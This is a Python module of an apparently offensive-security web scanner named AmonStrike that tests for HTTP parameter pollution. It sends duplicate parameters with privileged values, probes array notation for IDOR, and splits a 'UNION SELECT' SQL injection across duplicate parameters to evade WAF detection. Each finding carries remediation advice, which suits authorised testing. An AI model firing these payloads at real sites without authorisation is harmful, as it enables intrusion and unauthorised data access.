"""AmonStrike — HTTP Parameter Pollution Module"""
from .base import BaseModule

class ParameterPollutionModule(BaseModule):
    NAME        = "parameter_pollution"
    DESCRIPTION = "HPP — duplicate params, WAF bypass, logic confusion"

    def run(self):
        self.log("Testing HTTP parameter pollution...")
        self._test_duplicate_params()
        self._test_array_params()
        self._test_waf_bypass_via_hpp()
        return self.result()

    def _test_duplicate_params(self):
        """Send same param twice with different values."""
        params_of_interest = ["id","user_id","admin","role","price","amount","qty"]
        for param in params_of_interest:
            # First get baseline
            r0 = self.session.get(self.url, params={param:"1"}, timeout=self.timeout, verify=False)
            if not r0 or r0.status_code == 404: continue
            # Send with duplicate + privileged value
            url = f"{self.url}?{param}=1&{param}=admin&{param}=true"
            r = self.session.get(url, timeout=self.timeout, verify=False)
            if r and r.status_code != r0.status_code:
                self.add_finding(
                    title       = f"HTTP Parameter Pollution — \'{param}\'",
                    severity    = "MEDIUM",
                    description = f"Duplicate \'{param}\' parameters produce different response, indicating HPP vulnerability.",
                    evidence    = f"Normal: ?{param}=1 → {r0.status_code}\nPolluted: ?{param}=1&{param}=admin → {r.status_code}",
                    remediation = "Parse only the first or last instance of each parameter. Validate parameter uniqueness.",
                    url=url, parameter=param, payload=f"{param}=1&{param}=admin", cve="CWE-235",
                )

    def _test_array_params(self):
        """Test array parameter parsing."""
        for param in ["id","ids","user_id","item_id"]:
            # PHP/Rails array notation
            url = f"{self.url}?{param}[]=1&{param}[]=2&{param}[]=3"
            r = self.session.get(url, timeout=self.timeout, verify=False)
            if r and r.status_code == 200 and len(r.text) > 100:
                try:
                    data = r.json()
                    if isinstance(data, list) and len(data) > 1:
                        self.add_finding(
                            title       = f"Array Parameter Injection — IDOR Potential via \'{param}[]\' ",
                            severity    = "HIGH",
                            description = "Array notation returns multiple objects — IDOR via parameter pollution.",
                            evidence    = f"URL: {url}\nObjects returned: {len(data)}",
                            remediation = "Validate parameter types. Reject unexpected array inputs.",
                            url=url, parameter=param, payload=f"{param}[]=1&{param}[]=2", cve="CWE-235",
                        )
                except Exception: pass

    def _test_waf_bypass_via_hpp(self):
        """Use HPP to bypass WAF SQLi/XSS detection."""
        for param in ["id","search","q"]:
            r = self.session.get(
                f"{self.url}?{param}=1 UNION&{param}= SELECT 1,2,3",
                timeout=self.timeout, verify=False
            )
            if r and r.status_code not in [403,429,406]:
                if any(err in r.text.lower() for err in ["mysql","sql","syntax","ora-"]):
                    self.add_finding(
                        title       = f"WAF Bypass via HPP — SQLi Executed: \'{param}\'",
                        severity    = "CRITICAL",
                        description = "HPP split SQLi payload across parameters bypasses WAF detection.",
                        evidence    = f"Split payload across {param} parameters — SQL error in response",
                        remediation = "Combine multi-value parameters before WAF inspection.",
                        url=self.url, parameter=param, payload="UNION SELECT via HPP", cve="CWE-235",
                    )
